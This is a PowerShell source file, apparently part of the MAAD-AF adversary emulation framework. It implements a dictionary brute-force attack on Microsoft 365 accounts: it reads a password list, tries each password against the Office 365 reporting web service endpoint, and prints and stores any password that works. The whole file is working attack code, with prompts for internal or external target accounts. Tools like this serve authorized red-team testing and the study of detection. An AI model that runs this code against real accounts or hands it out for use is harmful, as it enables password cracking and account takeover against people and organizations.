###Primary Bruteforce function
function BruteForce ($target_account){
    #Check file input
    $check_file = $false
    while ($check_file -eq $false) {
        #Display available files in MAAD-AF directory
        $file_list = Get-ChildItem -Path ./Local/* -Include *.txt
        if ($null -eq $file_list) {
            Write-Host "`n[Note] No potential dictionary files found. Add a password dictionary text file to '$((Get-Item ./Local/).FullName)'" -ForegroundColor Red
        }
        else {
            Write-Host "`nPossible dictionary files found in the MAAD-AF directory:" -ForegroundColor Gray
            foreach ($file in $file_list.Name){
                Write-Host "- $file" -ForegroundColor Gray
            }
        }

        Write-Host "`n[Note] Place the password file in ./MAAD-AF/Local" -ForegroundColor Gray
        $filename = Read-Host -Prompt "`nEnter the password dictionary file name(eg: passwords.txt)"
        $filename = $filename.Trim()
        $check_file = Test-Path -Path .\Local\$filename
        
        if ($check_file -and $filename -ne "") {
            Write-Host "`n[.] File found" -ForegroundColor Gray
            #Check file format - Only txt files accepted
            $extn = [IO.Path]::GetExtension($filename) 
            if ($extn -ne ".txt") {
                Write-Host "`nInvalid file type: Please provide a 'txt' dictionary file with each password on a new line." -ForegroundColor Red
                $check_file = $false
            }
            else {
                $check_file = $true
            } 
        }
        else {
            Write-Host "`nPassword file: '$filename' not found. Check -`n1.If the spelling is correct`n2.If the file exists in the same directory as the tool`n3.Include extension in filename" -ForegroundColor Red
            $check_file = $false
        }
    }
    
    #Read input password file
    $passwords = Get-Content -Path .\Local\$filename

    Write-Host "`nStarting brute-force on user: $target_account using the password dictionary: $filename..."
    [int]$counter = 0
    Write-Progress -Activity "Running brute force" -Status "0% complete:" -PercentComplete 0;

    #Perform Brute-force.
    foreach ($password in $passwords) {
        #Convert password to secure string.
        $securestring = ConvertTo-SecureString $password -AsPlainText -Force

        #Create PSCredential object
        $credential = New-Object System.Management.Automation.PSCredential -ArgumentList ($target_account, $securestring)

        #Test authentication to Office 365 reporting API
        try {
            Invoke-WebRequest -Uri "https://reports.office365.com/ecp/reportingwebservice/reporting.svc" -Credential $credential -UseBasicParsing | Out-Null

            Write-Host "Username: $target_account"
            Write-Host "Password: $password"
            Write-Host "`n[Success] Cracked account password" -ForegroundColor Yellow

            #Save to cracked credntial to credential store
            AddCredentials "password" "BF_$target_account-$(([DateTimeOffset](Get-Date)).ToUnixTimeSeconds())" $target_account $password
            break
        } 
        catch {
            $counter++
            Write-Progress -Activity "Running brute-force attack" -Status "$([math]::Round($counter/$passwords.Count * 100))% complete:" -PercentComplete ([math]::Round($counter / $passwords.Count * 100));
        }
    }
    #Print if brute-force unsuccessful
    if ($userobject -eq $null){
        Write-Host "`nPassword not found" -ForegroundColor Yellow
    }
    Pause
}

###Internal Bruteforce function
function InternalBruteForce {
    mitre_details("BruteForce")

    #Get account to target
    EnterAccount ("`nEnter an account to brute-force (eg:user@org.com) or enter 'recon' to find all available accounts")
    $target_account = $global:account_username

    BruteForce($target_account)
}

###External Bruteforce function
function ExternalBruteForce {
    mitre_details("BruteForce")

    #Get account to target
    do {
        $target_account = Read-Host -Prompt "`nEnter an account to brute-force (eg:user@org.com)"
    } until ("" -ne $target_account)

    BruteForce($target_account)
}